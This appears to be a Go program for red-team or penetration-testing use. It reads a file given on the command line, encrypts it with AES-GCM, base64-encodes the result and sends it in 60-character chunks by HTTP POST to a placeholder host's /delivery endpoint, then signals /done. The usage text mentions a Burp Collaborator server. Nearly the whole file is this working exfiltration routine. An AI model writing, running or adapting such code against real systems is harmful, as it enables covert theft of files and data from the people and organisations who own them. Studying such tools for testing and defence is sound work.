package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strconv"
)

func init() {
	if len(os.Args) < 2 {
		fmt.Printf("Supply two or three arguments: %s <FILENAME> <AES KEY string> <OPTIONAL: BURP COLLAB SERVER>\n", os.Args[0])
	}
}

func encrypt(stringToEncrypt string, keyString string) (encryptedString string) {

	//Since the key is in string, we need to convert decode it to bytes
	key, _ := hex.DecodeString(keyString)
	plaintext := []byte(stringToEncrypt)

	//Create a new Cipher Block from the key
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}

	//Create a new GCM - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	//https://golang.org/pkg/crypto/cipher/#NewGCM
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}

	//Create a nonce. Nonce should be from GCM
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}

	//Encrypt the data using aesGCM.Seal
	//Since we don't want to save the nonce somewhere else in this case, we add it as a prefix to the encrypted data. The first nonce argument in Seal is the prefix.
	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	return fmt.Sprintf("%x", ciphertext)
}

func chunks(s string, chunkSize int) []string {
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string
	chunk := make([]rune, chunkSize)
	len := 0
	for _, r := range s {
		chunk[len] = r
		len++
		if len == chunkSize {
			chunks = append(chunks, string(chunk))
			len = 0
		}
	}
	if len > 0 {
		chunks = append(chunks, string(chunk[:len]))
	}
	return chunks
}

func exfil(encoded string) {
	chunkedboi := chunks(encoded, 60)
	Len := len(chunkedboi)
	fmt.Println(Len)

	for i := range chunkedboi {
		formData := url.Values{
			"data":   {chunkedboi[i]},
			"parcel": {strconv.Itoa(i)},
		}

		URL := "http://website/delivery"
		fmt.Printf("Sending Chunk %d:\n%s\n", i, chunkedboi[i])
		fmt.Println(URL)

		http.PostForm(URL, formData)

	}

	http.Get("http://website/done")
	fmt.Println("All chunks sent, sent to /done")

}

func decrypt(encryptedString string, keyString string) (decryptedString string) {

	key, _ := hex.DecodeString(keyString)
	enc, _ := hex.DecodeString(encryptedString)

	//Create a new Cipher Block from the key
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}

	//Create a new GCM
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}

	//Get the nonce size
	nonceSize := aesGCM.NonceSize()

	//Extract the nonce from the encrypted data
	nonce, ciphertext := enc[:nonceSize], enc[nonceSize:]

	//Decrypt the data
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}

	return fmt.Sprintf("%s", plaintext)
}

func main() {
	// Open file on disk.
	f, _ := os.Open(os.Args[1])

	// Read entire file into byte slice.
	reader := bufio.NewReader(f)
	content, _ := ioutil.ReadAll(reader)

	key := os.Args[2]
	plaintext := string(content)
	fmt.Println("encoded plaintext:")
	fmt.Println(plaintext)

	encrypted := encrypt(plaintext, key)
	fmt.Println("encrypted text")
	fmt.Println(encrypted)
	// Encode as base64.
	encoded := base64.RawURLEncoding.EncodeToString([]byte(encrypted))

	// Print encoded data to console.
	fmt.Println("ENCODED: " + encoded)

	exfil(encoded)
	fmt.Println(len(encoded))
	uDec, _ := base64.RawURLEncoding.DecodeString(encoded)
	decrypted := decrypt(string(uDec), key)

	fmt.Println(decrypted)

}
